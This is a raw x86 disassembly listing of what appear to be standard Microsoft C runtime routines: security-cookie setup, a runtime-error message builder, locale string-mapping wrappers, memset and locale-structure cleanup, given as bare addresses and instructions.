  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
